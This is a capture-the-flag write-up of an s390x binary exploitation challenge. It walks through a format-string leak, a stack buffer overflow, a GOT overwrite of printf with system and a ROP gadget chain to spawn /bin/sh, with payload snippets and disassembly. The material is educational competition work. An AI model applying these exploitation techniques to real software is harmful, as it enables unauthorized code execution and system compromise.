Gibson: format strings on s390x

A format-string leak and a BOF-driven ROP chain, made harder by an architecture nobody debugs for fun.
TL;DR Leak with a format string, then either ROP via the BOF or overwrite a GOT entry.

"Can you really call it a "main"frame if I haven't used it before now?"

Author:crandyman

No remote connection, Manual Submission Only

tl;dr

Leaks with Format String> ROP With BOF OR Leaks with Format String> GOT Overwrite

Overview

This challenge was a hard pwn from US Cyber Open. The exploit was actually not that complicated but the fact that it used the s390 architecture made it challenging. The lack of decent documentation and tooling support made this challenge unfamiliar and getting the local environment to work was a pain.

Setup

The challenge authors kindly provided the docker files that worked if you followed these specific steps

  • Use an Ubuntu 22.04 x86_64 VM with Docker version 20.10.16 and Docker Compose version v2.5.0
  • Run docker run --rm --privileged multiarch/qemu-user-static --reset -p yes as specified in the tips.md
  • docker compose build
  • docker compose up

The challenge had a nice setup with a competitor port that stimulated the challenge and a debug port that had gdb enabled

- 9999: Fake Infrastructure 
- 8888: Debug port, gdb-server on 1234

This gdb was for the s390x architecture so be sure to install gdb-multi-arch. GEF had a lot of issues so I ended up disabling most of its features.

s390x

The s390x is a 64 bit big endian architecture developed by IBM. Most of the instructions can be found here http://www.tachyonsoft.com/inst390m.htm. Here's a list of the registers that look very similar to Arm registers

s/390 & z/Architecture Register usage
=====================================
r0       used by syscalls/assembly                  call-clobbered
r1	 used by syscalls/assembly                  call-clobbered
r2       argument 0 / return value 0                call-clobbered
r3       argument 1 / return value 1 (if long long) call-clobbered
r4       argument 2                                 call-clobbered
r5       argument 3                                 call-clobbered
r6	 argument 4				    saved
r7       pointer-to arguments 5 to ...              saved      
r8       this & that                                saved
r9       this & that                                saved
r10      static-chain ( if nested function )        saved
r11      frame-pointer ( if function used alloca )  saved
r12      got-pointer                                saved
r13      base-pointer                               saved
r14      return-address                             saved
r15      stack-pointer                              saved

f0       argument 0 / return value ( float/double ) call-clobbered
f2       argument 1                                 call-clobbered
f4       z/Architecture argument 2                  saved
f6       z/Architecture argument 3                  saved
The remaining floating points
f1,f3,f5 f7-f15 are call-clobbered.

BUGS

Usually, in x84 the stack pointer is decremented at the start of each function to make space for local variables. Noticed how 1192 is subtracted from r15 (the stack pointer) at the beginning of the main function

 1000836:       e3 f0 fb 58 ff 71       lay     %r15,-1192(%r15)

This means that the stack buffer is probably around that size but the call to read seems to have 2000 as a parameter. Hence we have a buffer overflow!

 10008ba:       a7 49 07 d0             lghi    %r4,2000
 10008be:       b9 04 00 31             lgr     %r3,%r1
 10008c2:       a7 29 00 00             lghi    %r2,0
 10008c6:       c0 e5 ff ff fe 97       brasl   %r14,10005f4 <read@plt>

Printf takes in a buffer instead of a format string. This means that our input transformed will be passed directly to printf. The transformation does not seem too fancy as theirs an one-to-one mapping. This means its either adding a value or XORing out input

 1000924:       b9 04 00 21             lgr     %r2,%r1
 1000928:       c0 e5 ff ff fe 76       brasl   %r14,1000614 <printf@plt>               ; printf(buffer)

In this loop, all of these instructions seem like loads except one, xilf with XOR. It is xoring whatever is in r1 with 82 and then moving that into the buffer. We can confirm this by XORing our input with 82 and checking to see if we get the same input.

Attempt 1

If this was x86 the exploit path would be relatively simple, use printf to leak values and then overwrite GOT. The main difference is that I couldn't find the magically one_gadget. This means that I'll have to resort to replacing something in the GOT with system. Printf is a great candidate as our input is directly passed so if we input /bin/sh we should get a shell. The first issue is that after printf will exit so we need a way to loop the program. Luckily with our buffer overflow, we can overwrite the return address with main so it will loop forever.

Using GDB we can find the offset by spamming characters and checking which ones end up as the instructions pointer. After connecting to port 8888 it will hang until you attach to the gdb server on port 1234.

After inputting a cyclic pattern gdb crashes and we can find the offset as well as what register control we have.

With this offset, we can create a payload that will leak values and then loop the program

bof_offset = 1144
payload = b''
payload += xor("%p  "*10, 82) * 3
payload += b'A'*(bof_offset -len(payload))
payload += p64(exe.symbols.main)

p.send(payload)

After the first time, this payload is sent the return pointer will remain overwritten so we can get unlimited attempts at printf. My first exploit attempt took advantage of a partial GOT overwrite as printf and system were very close in this libc.

[ins] In [2]: hex(libc.symbols.printf - libc.symbols.system)
Out[2]: '0xbec0'

Doing a 32 bit overwrite was not possible as printing that many characters took a couple of minutes and there was a 1-minute timeout on the remote instance However, we can do a 16 bit overwrite to just change the last 2 bits of the GOT entry for printf. This was a very bad idea as most of the time alsr base caused the difference to leak into the next byte. We would need to do some brute forcing to get a good libc address.

printf: 0x7fc9a087 5070
system: 0x7fc9a086 91b0
                 ^^

Small Hiccups Here

  • Input is XORed with 82 so XOR all of the input
  • Printf will print a lot of extra characters, appending a NULL byte at the end of the printf will stop this
def sxor(payload):
    p.send(xor(payload + b'\x00',82))

EXPLOIT STEPS:

  • Overflow stack so return address is main
  • Printf("%p") to get libc leaks
  • Use printf padding to print bytes equal to libc.symbols.system & 0xffff
  • Use "%hn" to write to 16 bits of printf got address
  • Send /bin/sh xored

Eventually I got it working locally but on the remote instance, it didn't. I could not figure out what was going on and then I found out that most people had an exploit that worked most of the time so I decided to rewrite my exploit. After solving it I realized that this approach WOULD work but I was leaking libc wrong.

Most of the time the libc base was wrong or it segfaulted upon connection but running this in a loop eventually worked. After a couple more submissions I found out that my exploit never worked. I thought it was just luck but after some time I found out that most people used an exploit that worked almost 100% of the time. At this point, I decided to rewrite this exploit for it to be more stable. After the competition, I found out that this idea would work but I was leaking values incorrectly. The stacks always shifting so the %p on my machine might not be the same on remote.

Hence if we can control the stack we can use this as a "ret" like in ROP. Now if we call system we only need to control arg1 which is r2. After the overflow, we have control of r11-15 so if we can get a move instruction to move something from those registers to r2 we can call the system. Using objdump I dumped the entire libc and then grepped through it looking for instructions that moved r11 into r2. The best scenario is that after this it immediately calls our "ret".

grep -r l*l.*r2.*r11 libc.disasm -A 2 |  grep  "br..r14" -B 2

To my surprise, this actually existed in the binary and at this point, we were done.

  160554:       b9 14 00 2b             lgfr    %r2,%r11           
  160558:       eb 6f f0 e8 00 04       lmg     %r6,%r15,232(%r15)
  16055e:       07 fe                   br      %r14

Small hicups along the way:

  • lgr seems to move 32 bits only, hence the string of /bin/sh in libc won't work. I had to use my format string to write to the binary BSS as that address was 32 bits
  • r15 NEEDS to be a valid address that can be used as the stack. Using the BSS didn't work for me (it did for some others) so I ended up leaking libc's environ to find the stack. From there I calculated the offset to the current stack pointer, I always used this pointer as it worked nicely.

FINAL EXPLOIT STEPS:

  • Overflow stack so return address is main
  • Printf("%p") to get libc leaks
  • Leak libc.environ to get stack leak
  • Format String to move "/bin/sh" into .bss
  • ROP using a gadget to "pop r2" and system

At this point, I had a super reliable exploit locally but on remote, it didn't work again. At this point, there were a couple of hours of the CTF left and I was freaking out. After opening a ticket I realized that my libc addresses were wrong. Nothing made sense until I got a IP to connect to and I checked the value at libc base. To my surprise, it was not "ELF" instead it was some massive chunk of bytes. At this point, I realized that using %p to leak stack values is not a good idea as the stack shifts a lot. Instead, I used the format string to leak the GOT. After this, my exploit worked!!

Lessons Learned:

  • Never assume addresses, if you have a leak always validate them
  • When learning a new architecture try to map instructions to ones that you are already familiar with
  • GDB's your best friend for learning new architectures
